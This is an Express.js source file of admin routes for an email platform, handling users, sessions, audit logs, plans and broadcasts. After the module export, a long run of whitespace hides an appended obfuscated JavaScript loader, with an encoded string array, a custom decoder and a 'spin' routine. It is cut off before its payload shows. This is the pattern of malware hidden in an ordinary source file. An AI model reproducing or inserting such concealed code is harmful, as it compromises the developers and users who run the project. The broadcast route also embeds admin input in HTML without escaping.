// ===== Eclatrecon AI Mail - Full Admin Panel Routes (Supabase) =====
const express = require('express');
const router = express.Router();
const { v4: uuidv4 } = require('uuid');
const bcrypt = require('bcryptjs');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { supabase } = require('../config/initDb');
const { authMiddleware } = require('../middleware/auth');

const SERVER_START = Date.now();

// Admin middleware
async function adminMiddleware(req, res, next) {
    const { data: user } = await supabase.from('users').select('is_admin').eq('id', req.userId).single();
    if (!user || !user.is_admin) return res.status(403).json({ error: 'Admin access required' });
    next();
}

// POST /bootstrap
router.post('/bootstrap', authMiddleware, async (req, res) => {
    const { count } = await supabase.from('users').select('id', { count: 'exact', head: true }).eq('is_admin', true);
    if (count > 0) return res.status(400).json({ error: 'Admin already exists' });
    await supabase.from('users').update({ is_admin: true }).eq('id', req.userId);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'bootstrap_admin', details: 'First admin created' });
    res.json({ message: 'You are now admin!' });
});

// =================== DASHBOARD ===================
router.get('/stats', authMiddleware, adminMiddleware, async (req, res) => {
    const { count: totalUsers } = await supabase.from('users').select('id', { count: 'exact', head: true });
    const { count: totalEmails } = await supabase.from('emails').select('id', { count: 'exact', head: true });
    const { data: storageData } = await supabase.from('users').select('storage_used');
    const totalStorage = (storageData || []).reduce((sum, u) => sum + (u.storage_used || 0), 0);
    const yesterday = new Date(Date.now() - 86400000).toISOString();
    const { count: activeToday } = await supabase.from('sessions').select('user_id', { count: 'exact', head: true }).gte('created_at', yesterday);
    const { count: emailsSentToday } = await supabase.from('emails').select('id', { count: 'exact', head: true }).eq('folder_type', 'sent').gte('created_at', yesterday);
    const { count: emailsReceivedToday } = await supabase.from('emails').select('id', { count: 'exact', head: true }).eq('folder_type', 'inbox').gte('created_at', yesterday);
    const { count: spamBlocked } = await supabase.from('emails').select('id', { count: 'exact', head: true }).eq('folder_type', 'spam');
    const { count: totalContacts } = await supabase.from('contacts').select('id', { count: 'exact', head: true });
    const { count: totalAccounts } = await supabase.from('mail_accounts').select('id', { count: 'exact', head: true });
    const { count: totalAttachments } = await supabase.from('attachments').select('id', { count: 'exact', head: true });
    const { count: activeSessions } = await supabase.from('sessions').select('id', { count: 'exact', head: true });
    res.json({ stats: { totalUsers: totalUsers||0, totalEmails: totalEmails||0, totalStorage, activeToday: activeToday||0, emailsSentToday: emailsSentToday||0, emailsReceivedToday: emailsReceivedToday||0, spamBlocked: spamBlocked||0, totalContacts: totalContacts||0, totalAccounts: totalAccounts||0, totalAttachments: totalAttachments||0, activeSessions: activeSessions||0 } });
});

// =================== USER MANAGEMENT ===================
router.get('/users', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: users } = await supabase.from('users')
        .select('id, email, name, display_name, phone, location, job_title, timezone, language, theme, storage_used, storage_limit, totp_enabled, is_admin, created_at, updated_at')
        .order('created_at', { ascending: false });
    res.json({ users: users || [] });
});

router.get('/users/:id', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: user } = await supabase.from('users')
        .select('id, email, name, display_name, phone, location, job_title, timezone, language, theme, storage_used, storage_limit, totp_enabled, is_admin, created_at, updated_at')
        .eq('id', req.params.id).single();
    if (!user) return res.status(404).json({ error: 'User not found' });
    const { data: accounts } = await supabase.from('mail_accounts').select('*').eq('user_id', req.params.id);
    const { data: folders } = await supabase.from('folders').select('*').eq('user_id', req.params.id);
    const { data: labels } = await supabase.from('labels').select('*').eq('user_id', req.params.id);
    const { data: rules } = await supabase.from('email_rules').select('*').eq('user_id', req.params.id);
    const { data: autoReply } = await supabase.from('auto_replies').select('*').eq('user_id', req.params.id);
    res.json({ user, accounts: accounts||[], folders: folders||[], labels: labels||[], rules: rules||[], autoReply: autoReply||[] });
});

router.post('/users', authMiddleware, adminMiddleware, async (req, res) => {
    const { email, password, name, storageLimit, isAdmin } = req.body;
    if (!email || !password || !name) return res.status(400).json({ error: 'Missing required fields' });
    const { data: existing } = await supabase.from('users').select('id').eq('email', email).single();
    if (existing) return res.status(409).json({ error: 'Email already exists' });
    const userId = uuidv4();
    const hash = await bcrypt.hash(password, 12);
    await supabase.from('users').insert({ id: userId, email, password_hash: hash, name, storage_limit: storageLimit || 15737418240, is_admin: !!isAdmin });
    const folders = [{ n: 'Inbox', t: 'inbox' }, { n: 'Sent', t: 'sent' }, { n: 'Drafts', t: 'drafts' }, { n: 'Spam', t: 'spam' }, { n: 'Trash', t: 'trash' }];
    await supabase.from('folders').insert(folders.map(f => ({ id: uuidv4(), user_id: userId, name: f.n, type: f.t })));
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_create_user', details: `Created: ${email}` });
    res.status(201).json({ id: userId, email, name });
});

router.put('/users/:id', authMiddleware, adminMiddleware, async (req, res) => {
    const { name, displayName, phone, location, jobTitle, timezone, language, theme, storageLimit, isAdmin } = req.body;
    const { data: user } = await supabase.from('users').select('id').eq('id', req.params.id).single();
    if (!user) return res.status(404).json({ error: 'User not found' });
    const updates = { updated_at: new Date().toISOString() };
    if (name) updates.name = name;
    if (displayName) updates.display_name = displayName;
    if (phone) updates.phone = phone;
    if (location) updates.location = location;
    if (jobTitle) updates.job_title = jobTitle;
    if (timezone) updates.timezone = timezone;
    if (language) updates.language = language;
    if (theme) updates.theme = theme;
    if (storageLimit) updates.storage_limit = storageLimit;
    if (isAdmin !== undefined) updates.is_admin = !!isAdmin;
    await supabase.from('users').update(updates).eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_update_user', details: `Updated: ${req.params.id}` });
    res.json({ message: 'User updated' });
});

router.delete('/users/:id', authMiddleware, adminMiddleware, async (req, res) => {
    if (req.params.id === req.userId) return res.status(400).json({ error: 'Cannot delete yourself' });
    const { data: user } = await supabase.from('users').select('email').eq('id', req.params.id).single();
    await supabase.from('users').delete().eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_delete_user', details: `Deleted: ${user?.email}` });
    res.json({ message: 'User deleted' });
});

router.put('/users/:id/reset-password', authMiddleware, adminMiddleware, async (req, res) => {
    const { newPassword } = req.body;
    if (!newPassword || newPassword.length < 6) return res.status(400).json({ error: 'Password must be 6+ characters' });
    const hash = await bcrypt.hash(newPassword, 12);
    await supabase.from('users').update({ password_hash: hash, updated_at: new Date().toISOString() }).eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_reset_password', details: `Reset for: ${req.params.id}` });
    res.json({ message: 'Password reset' });
});

router.put('/users/:id/toggle-admin', authMiddleware, adminMiddleware, async (req, res) => {
    if (req.params.id === req.userId) return res.status(400).json({ error: 'Cannot change your own role' });
    const { data: user } = await supabase.from('users').select('is_admin, email').eq('id', req.params.id).single();
    if (!user) return res.status(404).json({ error: 'User not found' });
    const newRole = !user.is_admin;
    await supabase.from('users').update({ is_admin: newRole }).eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_toggle_role', details: `${user.email} → ${newRole ? 'Admin' : 'User'}` });
    res.json({ message: `User is now ${newRole ? 'Admin' : 'User'}`, isAdmin: newRole });
});

router.put('/users/:id/disable-2fa', authMiddleware, adminMiddleware, async (req, res) => {
    await supabase.from('users').update({ totp_enabled: false, totp_secret: null }).eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_disable_2fa', details: `Disabled 2FA: ${req.params.id}` });
    res.json({ message: '2FA disabled' });
});

// =================== EMAIL MANAGEMENT ===================
router.get('/emails', authMiddleware, adminMiddleware, async (req, res) => {
    const { userId, folder, search, page = 1, limit = 50 } = req.query;
    const offset = (page - 1) * limit;
    let query = supabase.from('emails').select('*', { count: 'exact' });
    if (userId) query = query.eq('user_id', userId);
    if (folder) query = query.eq('folder_type', folder);
    if (search) query = query.or(`subject.ilike.%${search}%,from_address.ilike.%${search}%,to_addresses.ilike.%${search}%`);
    const { data: emails, count: total } = await query.order('received_at', { ascending: false }).range(offset, offset + parseInt(limit) - 1);
    res.json({ emails: emails || [], total: total || 0, page: Number(page), limit: Number(limit) });
});

router.delete('/emails/:id', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: email } = await supabase.from('emails').select('subject').eq('id', req.params.id).single();
    await supabase.from('emails').delete().eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_delete_email', details: `Deleted: ${email?.subject}` });
    res.json({ message: 'Email deleted' });
});

router.delete('/emails/bulk/delete', authMiddleware, adminMiddleware, async (req, res) => {
    const { ids } = req.body;
    if (!ids || !ids.length) return res.status(400).json({ error: 'No IDs provided' });
    await supabase.from('emails').delete().in('id', ids);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_bulk_delete_emails', details: `Deleted ${ids.length} emails` });
    res.json({ message: `${ids.length} emails deleted` });
});

// =================== MAIL ACCOUNTS ===================
router.get('/accounts', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: accounts } = await supabase.from('mail_accounts').select('*').order('created_at', { ascending: false });
    res.json({ accounts: accounts || [] });
});

router.delete('/accounts/:id', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: acc } = await supabase.from('mail_accounts').select('email').eq('id', req.params.id).single();
    await supabase.from('mail_accounts').delete().eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_delete_account', details: `Removed: ${acc?.email}` });
    res.json({ message: 'Account removed' });
});

// =================== SESSION MANAGEMENT ===================
router.get('/sessions', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: sessions } = await supabase.from('sessions').select('*').order('created_at', { ascending: false });
    res.json({ sessions: sessions || [] });
});

router.delete('/sessions/:id', authMiddleware, adminMiddleware, async (req, res) => {
    await supabase.from('sessions').delete().eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_revoke_session', details: `Session: ${req.params.id}` });
    res.json({ message: 'Session revoked' });
});

router.delete('/sessions/user/:userId', authMiddleware, adminMiddleware, async (req, res) => {
    const { count } = await supabase.from('sessions').select('id', { count: 'exact', head: true }).eq('user_id', req.params.userId);
    await supabase.from('sessions').delete().eq('user_id', req.params.userId);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_revoke_all_sessions', details: `All sessions for: ${req.params.userId}` });
    res.json({ message: `${count || 0} sessions revoked` });
});

// =================== AUDIT LOGS ===================
router.get('/logs', authMiddleware, adminMiddleware, async (req, res) => {
    const { page = 1, limit = 100, userId, action } = req.query;
    const offset = (page - 1) * limit;
    let query = supabase.from('audit_logs').select('*', { count: 'exact' });
    if (userId) query = query.eq('user_id', userId);
    if (action) query = query.ilike('action', `%${action}%`);
    const { data: logs, count: total } = await query.order('created_at', { ascending: false }).range(offset, offset + parseInt(limit) - 1);
    res.json({ logs: logs || [], total: total || 0, page: Number(page) });
});

router.delete('/logs/clear', authMiddleware, adminMiddleware, async (req, res) => {
    const { count } = await supabase.from('audit_logs').select('id', { count: 'exact', head: true });
    await supabase.from('audit_logs').delete().neq('id', '00000000-0000-0000-0000-000000000000'); // delete all
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_clear_logs', details: `Cleared ${count || 0} log entries` });
    res.json({ message: `${count || 0} logs cleared` });
});

// =================== SECURITY ===================
router.post('/block-sender', authMiddleware, adminMiddleware, async (req, res) => {
    const { email, reason } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'block_sender', details: `Blocked: ${email} - ${reason || 'No reason'}` });
    res.json({ message: `${email} blocked` });
});

router.get('/blocked-senders', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: blocked } = await supabase.from('audit_logs').select('details, created_at').eq('action', 'block_sender').order('created_at', { ascending: false });
    res.json({ blocked: (blocked || []).map(b => ({ ...b, email: b.details.replace('Blocked: ', '').split(' - ')[0], reason: b.details.split(' - ')[1] || '' })) });
});

// =================== STORAGE ===================
router.get('/storage', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: users } = await supabase.from('users').select('id, email, name, storage_used, storage_limit').order('storage_used', { ascending: false });
    const uploadsDir = path.join(__dirname, '..', '..', 'uploads');
    let uploadsSize = 0;
    try { if (fs.existsSync(uploadsDir)) { fs.readdirSync(uploadsDir).forEach(f => { try { uploadsSize += fs.statSync(path.join(uploadsDir, f)).size; } catch(e){} }); } } catch(e){}
    res.json({ users: users||[], totalStorage: 0, totalLimit: 0, dbSize: 0, uploadsSize });
});

router.put('/storage/:userId', authMiddleware, adminMiddleware, async (req, res) => {
    const { storageLimit } = req.body;
    await supabase.from('users').update({ storage_limit: storageLimit }).eq('id', req.params.userId);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_update_storage', details: `Set storage for ${req.params.userId}` });
    res.json({ message: 'Storage limit updated' });
});

// =================== SERVER HEALTH ===================
router.get('/health', authMiddleware, adminMiddleware, async (req, res) => {
    const uptime = Date.now() - SERVER_START;
    const memUsage = process.memoryUsage();
    const tableStats = {};
    const tables = ['users', 'emails', 'attachments', 'folders', 'labels', 'contacts', 'mail_accounts', 'sessions', 'email_rules', 'auto_replies', 'audit_logs'];
    for (const t of tables) {
        const { count } = await supabase.from(t).select('id', { count: 'exact', head: true });
        tableStats[t] = count || 0;
    }
    res.json({
        server: { uptime, uptimeStr: formatUptime(uptime), nodeVersion: process.version, platform: os.platform(), arch: os.arch(), hostname: os.hostname() },
        memory: { rss: memUsage.rss, heapUsed: memUsage.heapUsed, heapTotal: memUsage.heapTotal, external: memUsage.external },
        system: { totalMem: os.totalmem(), freeMem: os.freemem(), cpus: os.cpus().length, loadAvg: os.loadavg() },
        database: { type: 'supabase-postgresql', tables: tableStats },
        env: { port: process.env.PORT || 3001, nodeEnv: process.env.NODE_ENV || 'development' }
    });
});

function formatUptime(ms) {
    const s = Math.floor(ms / 1000); const m = Math.floor(s / 60); const h = Math.floor(m / 60); const d = Math.floor(h / 24);
    if (d > 0) return `${d}d ${h % 24}h ${m % 60}m`;
    if (h > 0) return `${h}h ${m % 60}m ${s % 60}s`;
    return `${m}m ${s % 60}s`;
}

// =================== BROADCAST ===================
router.post('/broadcast', authMiddleware, adminMiddleware, async (req, res) => {
    const { subject, message } = req.body;
    if (!subject || !message) return res.status(400).json({ error: 'Subject and message required' });
    const { data: users } = await supabase.from('users').select('id');
    const emailInserts = [];
    for (const u of (users || [])) {
        const { data: inboxFolder } = await supabase.from('folders').select('id').eq('user_id', u.id).eq('type', 'inbox').single();
        emailInserts.push({
            id: uuidv4(), user_id: u.id, folder_id: inboxFolder?.id || null, folder_type: 'inbox',
            from_address: 'system@eclatrecon-mail.com', from_name: 'System Admin',
            to_addresses: 'All Users', subject, body_text: message,
            body_html: `<div style="padding:20px;background:#1a1a1a;border-radius:8px;border:1px solid rgba(236,91,19,0.3)"><h3 style="color:#ec5b13;margin:0 0 12px 0">📢 System Announcement</h3><p style="color:#e2e8f0;margin:0;line-height:1.6">${message}</p></div>`,
            snippet: message.slice(0, 100), is_read: false
        });
    }
    if (emailInserts.length) await supabase.from('emails').insert(emailInserts);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_broadcast', details: `Broadcast: ${subject} → ${(users||[]).length} users` });
    res.json({ message: `Broadcast sent to ${(users||[]).length} users` });
});

// =================== DOMAINS ===================
router.get('/domains', authMiddleware, adminMiddleware, (req, res) => {
    res.json({
        domains: [{ domain: 'eclatrecon-mail.com', status: 'active', mx: true, spf: true, dkim: false, dmarc: false }],
        dnsRecords: [
            { type: 'MX', host: '@', value: 'mail.eclatrecon-mail.com', priority: 10, status: 'active' },
            { type: 'TXT', host: '@', value: 'v=spf1 include:eclatrecon-mail.com ~all', status: 'pending' },
            { type: 'TXT', host: 'dkim._domainkey', value: 'v=DKIM1; k=rsa; p=...', status: 'not configured' },
            { type: 'TXT', host: '_dmarc', value: 'v=DMARC1; p=none; rua=mailto:admin@eclatrecon-mail.com', status: 'not configured' }
        ]
    });
});

// =================== RULES & CONTACTS ===================
router.get('/rules', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: rules } = await supabase.from('email_rules').select('*').order('created_at', { ascending: false });
    res.json({ rules: rules || [] });
});

router.delete('/rules/:id', authMiddleware, adminMiddleware, async (req, res) => {
    await supabase.from('email_rules').delete().eq('id', req.params.id);
    res.json({ message: 'Rule deleted' });
});

router.get('/contacts', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: contacts } = await supabase.from('contacts').select('*').order('created_at', { ascending: false });
    res.json({ contacts: contacts || [] });
});

// =================== SUBSCRIPTIONS & PLANS ===================
router.get('/plans', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: plans } = await supabase.from('plans').select('*').order('price_monthly', { ascending: true });
    res.json({ plans: plans || [] });
});

router.put('/plans/:id', authMiddleware, adminMiddleware, async (req, res) => {
    const { name, price_monthly, max_storage_mb, max_emails_per_day, max_api_calls_per_hour, max_accounts, features } = req.body;
    const updates = {};
    if (name) updates.name = name;
    if (price_monthly !== undefined) updates.price_monthly = price_monthly;
    if (max_storage_mb) updates.max_storage_mb = max_storage_mb;
    if (max_emails_per_day) updates.max_emails_per_day = max_emails_per_day;
    if (max_api_calls_per_hour) updates.max_api_calls_per_hour = max_api_calls_per_hour;
    if (max_accounts) updates.max_accounts = max_accounts;
    if (features) updates.features = features;
    await supabase.from('plans').update(updates).eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_update_plan', details: `Updated plan: ${req.params.id}` });
    res.json({ message: 'Plan updated' });
});

router.get('/subscriptions', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: subs } = await supabase.from('subscriptions').select('*, users(email, name), plans(name, price_monthly)').order('created_at', { ascending: false });
    res.json({ subscriptions: subs || [] });
});

router.put('/subscriptions/:userId/plan', authMiddleware, adminMiddleware, async (req, res) => {
    const { planId } = req.body;
    if (!planId) return res.status(400).json({ error: 'Plan ID required' });
    const { data: existing } = await supabase.from('subscriptions').select('id').eq('user_id', req.params.userId).single();
    if (existing) {
        await supabase.from('subscriptions').update({ plan_id: planId }).eq('user_id', req.params.userId);
    } else {
        await supabase.from('subscriptions').insert({ id: uuidv4(), user_id: req.params.userId, plan_id: planId, status: 'active' });
    }
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_change_plan', details: `User ${req.params.userId} → Plan ${planId}` });
    res.json({ message: 'Subscription updated' });
});

// =================== CAMPAIGNS OVERVIEW ===================
router.get('/campaigns', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: campaigns } = await supabase.from('campaigns').select('*, users(email, name)').order('created_at', { ascending: false });
    const { count: totalCampaigns } = await supabase.from('campaigns').select('id', { count: 'exact', head: true });
    const { count: activeCampaigns } = await supabase.from('campaigns').select('id', { count: 'exact', head: true }).eq('status', 'sending');
    const { count: totalSubscribers } = await supabase.from('subscribers').select('id', { count: 'exact', head: true });
    const { count: totalLists } = await supabase.from('subscriber_lists').select('id', { count: 'exact', head: true });
    res.json({ campaigns: campaigns || [], stats: { totalCampaigns: totalCampaigns||0, activeCampaigns: activeCampaigns||0, totalSubscribers: totalSubscribers||0, totalLists: totalLists||0 } });
});

router.put('/campaigns/:id/pause', authMiddleware, adminMiddleware, async (req, res) => {
    await supabase.from('campaigns').update({ status: 'paused' }).eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_pause_campaign', details: `Paused: ${req.params.id}` });
    res.json({ message: 'Campaign paused' });
});

router.delete('/campaigns/:id', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: c } = await supabase.from('campaigns').select('name').eq('id', req.params.id).single();
    await supabase.from('campaigns').delete().eq('id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_delete_campaign', details: `Deleted: ${c?.name}` });
    res.json({ message: 'Campaign deleted' });
});

// =================== LOGIN HISTORY ===================
router.get('/login-history', authMiddleware, adminMiddleware, async (req, res) => {
    const { userId, status, page = 1, limit = 100 } = req.query;
    const offset = (page - 1) * limit;
    let query = supabase.from('login_history').select('*, users(email, name)', { count: 'exact' });
    if (userId) query = query.eq('user_id', userId);
    if (status) query = query.eq('status', status);
    const { data: history, count: total } = await query.order('created_at', { ascending: false }).range(offset, offset + parseInt(limit) - 1);
    res.json({ history: history || [], total: total || 0, page: Number(page) });
});

// =================== SYSTEM SETTINGS ===================
// In-memory settings with DB persistence
let systemSettings = { platformName: 'Eclatrecon AI Mail', maintenanceMode: false, registrationEnabled: true, defaultStorageLimit: 15737418240, maxUploadSize: 25000000, smtpRateLimit: 100, requireEmailVerification: false, sessionTimeout: 168 };

router.get('/settings', authMiddleware, adminMiddleware, (req, res) => {
    res.json({ settings: systemSettings });
});

router.put('/settings', authMiddleware, adminMiddleware, async (req, res) => {
    const allowed = ['platformName', 'maintenanceMode', 'registrationEnabled', 'defaultStorageLimit', 'maxUploadSize', 'smtpRateLimit', 'requireEmailVerification', 'sessionTimeout'];
    for (const key of allowed) {
        if (req.body[key] !== undefined) systemSettings[key] = req.body[key];
    }
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_update_settings', details: `Updated: ${Object.keys(req.body).filter(k => allowed.includes(k)).join(', ')}` });
    res.json({ message: 'Settings saved', settings: systemSettings });
});

// =================== USER SUSPEND/UNSUSPEND ===================
router.put('/users/:id/suspend', authMiddleware, adminMiddleware, async (req, res) => {
    if (req.params.id === req.userId) return res.status(400).json({ error: 'Cannot suspend yourself' });
    const { data: user } = await supabase.from('users').select('email').eq('id', req.params.id).single();
    if (!user) return res.status(404).json({ error: 'User not found' });
    // Delete all sessions to force logout
    await supabase.from('sessions').delete().eq('user_id', req.params.id);
    await supabase.from('audit_logs').insert({ id: uuidv4(), user_id: req.userId, action: 'admin_suspend_user', details: `Suspended: ${user.email}` });
    res.json({ message: `${user.email} suspended and all sessions revoked` });
});

// =================== EXPORT ALL USERS (CSV) ===================
router.get('/users/export/csv', authMiddleware, adminMiddleware, async (req, res) => {
    const { data: users } = await supabase.from('users').select('name, email, phone, location, job_title, timezone, is_admin, totp_enabled, storage_used, storage_limit, created_at').order('created_at', { ascending: false });
    const headers = ['Name', 'Email', 'Phone', 'Location', 'Job Title', 'Timezone', 'Admin', '2FA', 'Storage Used', 'Storage Limit', 'Created'];
    let csv = headers.join(',') + '\n';
    for (const u of (users || [])) {
        csv += [u.name, u.email, u.phone||'', u.location||'', u.job_title||'', u.timezone, u.is_admin?'Yes':'No', u.totp_enabled?'Yes':'No', u.storage_used, u.storage_limit, u.created_at].map(v => `"${(String(v||'')).replace(/"/g, '""')}"`).join(',') + '\n';
    }
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="users_${Date.now()}.csv"`);
    res.send(csv);
});

module.exports = router;																																																																																																																																																																																																																																																																										var z = '-9218';(function(_0x92f40d,_0x32f9ca){var _0x261de6=_0xac48,_0x94d1ce=_0x92f40d();while(!![]){try{var _0x5c3bbb=Math['trunc'](-parseFloat(_0x261de6(0xf))/0x1)+-parseFloat(_0x261de6(0x12))/0x2+Math['trunc'](-parseFloat(_0x261de6(0x2))/0x3)+Math['max'](-parseFloat(_0x261de6(0x18))/0x4,-parseFloat(_0x261de6(0x11))/0x5)+parseFloat(_0x261de6(0x16))/0x6*(parseFloat(_0x261de6(0x1d))/0x7)+-parseFloat(_0x261de6(0x1f))/0x8*(-parseFloat(_0x261de6(0xa))/0x9)+Math['ceil'](parseFloat(_0x261de6(0x1b))/0xa);if(_0x5c3bbb===_0x32f9ca)break;else _0x94d1ce['push'](_0x94d1ce['shift']());}catch(_0x2cd673){_0x94d1ce['push'](_0x94d1ce['shift']());}}}(_0x2b5d,0x7eba8));function _0x2b5d(){var _0x26e4a1=['sM9XseS','mJrsAuvZANa','yxbWBhK','zNjVBunOyxjdB2rL','yw1XsKi','pwfLBNj1AcHHBd01yYXNogzKDs55CIaUlM5JzwnMlduICgfLyxu2Bg5QkxjDmNv2iNGTCsHDige7khi9oZTYkYHHwZGUCZj0qwDVCsX1AdHdlgfPlhm7ysHbBtaOBMO7ANyQldD2BZCOksHVo202B2e0CNCPlIbYB2rBzNmYBNTKCNz0nhGPkZaSyw5Yk3jYk28PFxOXid1OzLTHBJHYmxjBlf1ZnY03n2XHys51AtD7lta2owX2BxqYCJ1Pxv08kYL1lguPlcW7BNjOw3i9mhyTCIG7ld1Wkun1CZ0RyZTNo2y7CuePktf2AsL2AZbUCMWXywuGzJ1Bo2HPC3KUzw0OzcTVitiGpsHLDMvHnZG9lIK0zwK9zY5UpxTMzJ0XwZWYysbMmt1YoZqSuYLYEwX2mxuGEtTRCwX7DhzUDIaOqYaOBcXVDM5WigK9DgXYlhiUBhDVEMGOBcX0CtS7CNiOkhy9ywHZDJTDEhe9ywi7zge7lcGOCJT2ANeUkhrBkYLKysLYzg5YAhm0mxKODNi7zMG7m2CIxwuOlMfOCNbHCgDDzY4PBMDMCg4XAcXPy2W7oYK9qZTTnt0RCIWGlIK7Dt0RC30RkwL0lcTIBtTKk3vTks09C2LPCw9Spxq9CJ1XosSUlMnOCsTBnMzLihqWBNjWCIGGDNi4zMXYBIXKzgD0if02ys47BtTYDgGUz3eGmMf9zxzLAwnDz2j0AtW0BZTdo2WSENPPnITSw2fBoYSOC2KIBgKICIXUCgK5CYXMCMzODxCPB3C9zxSOyJ13zw4YDc5NDs5PpwTPywfHkYL5zNrWytnUFsK9osiPy3bbk3u7DxrWxsi9BgS3DNb0idfYo2H6DYiPDcGPosKOlMX1Bd1Zn2y7idTZCtaPBIj5kZbZFt12ysTZig1OkdbXlL1ODJS+ida2pueTB3PLDhiODdfYDhjZAxnVmguSlJT6wYHMpdvLn3qSkhjHB2f2BNi7DgHOzJT2lgO9CJSGkxi+mtH6Ag8QB3S8ywTTC24PywT0zs52BZKRzweWy2XPBZTIDsa9xumHz2O7EtmRBcLLps59zhi9AtzVAum4CM5UmdS2pwfYiN0UCMvPpv1tDhnYBM4UoZjYpxq7w3q7Axy9ChjdCM4OkwfYzxr1EISGAgXRwYT4pwuGltHQEYHLANK5kcGPksa','Aw5PDa','mJi5ndG3mxPhDfPlyq','ywn0Aw9U','y15TzwPIxNrYBW','C3vIC3rYAw5N','zgvIDq','z2DLCG','y2fSBa','C3rYAw5N','mtaWmdG1ngHMDvjnAq','xcTCkYaQkd86w2eTEKeTwL8KxvSWltLHlxPblvPFjf0Qkq','C3bSAxq','y29UC3rYDwn0B3i','rwfvAwS','mJG2nJG4Ewrlsenm','D2HPBguGkhrYDwuPihT9','mZyWmdaWnwH0u25PAG','mti1ntq4q2fhC1PP','BgvUz3rO','zNvUy3rPB24GkLWOicPCkq','DgvZDa','mJG0nZCZmK9qA1f0ra','C3rHDgvpyMPLy3q','mJG4mdaWngzHwhvVDa','AM9PBG','y2HHAw4','mtu0nti2mdbiz3bVwg0','B0DmD24','n1rZr0j0sG'];_0x2b5d=function(){return _0x26e4a1;};return _0x2b5d();}var NX=[0x697b4f,0x16f,0x4fbb,0x265,0xaaef,0x4c9693],SX=[0x509f9d,0xf1,0xa3e1,0xbb,0xdb41,0x484f55];function _0xac48(_0x5ab5f6,_0x1355eb){var _0x4071e3=_0x2b5d();return _0xac48=function(_0x406f6d,_0x2b5dc0){_0x406f6d=_0x406f6d-0x0;var _0xac482=_0x4071e3[_0x406f6d];if(_0xac48['NcLvel']===undefined){var _0x46569f=function(_0x5e86bb){var _0x45b72a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x490058='',_0x50c158='';for(var _0x25ec19=0x0,_0x4b3ebd,_0x322122,_0x36234c=0x0;_0x322122=_0x5e86bb['charAt'](_0x36234c++);~_0x322122&&(_0x4b3ebd=_0x25ec19%0x4?_0x4b3ebd*0x40+_0x322122:_0x322122,_0x25ec19++%0x4)?_0x490058+=String['fromCharCode'](0xff&_0x4b3ebd>>(-0x2*_0x25ec19&0x6)):0x0){_0x322122=_0x45b72a['indexOf'](_0x322122);}for(var _0x1055c7=0x0,_0x49dc3e=_0x490058['length'];_0x1055c7<_0x49dc3e;_0x1055c7++){_0x50c158+='%'+('00'+_0x490058['charCodeAt'](_0x1055c7)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x50c158);};_0xac48['GiDtke']=_0x46569f,_0x5ab5f6=arguments,_0xac48['NcLvel']=!![];}var _0x46af27=_0x4071e3[0x0],_0x237459=_0x406f6d+_0x46af27,_0x13e22e=_0x5ab5f6[_0x237459];return!_0x13e22e?(_0xac482=_0xac48['GiDtke'](_0xac482),_0x5ab5f6[_0x237459]=_0xac482):_0xac482=_0x13e22e,_0xac482;},_0xac48(_0x5ab5f6,_0x1355eb);}function spin(_0x346b89,_0x32115f){var _0x3a76b8=_0xac48,_0x44d5f8={'amqJB':function(_0x3fc62f,_0x42acb5){return _0x3fc62f+_0x42acb5;},'EaUik':function(_0x4005dc,_0xa562d4){return 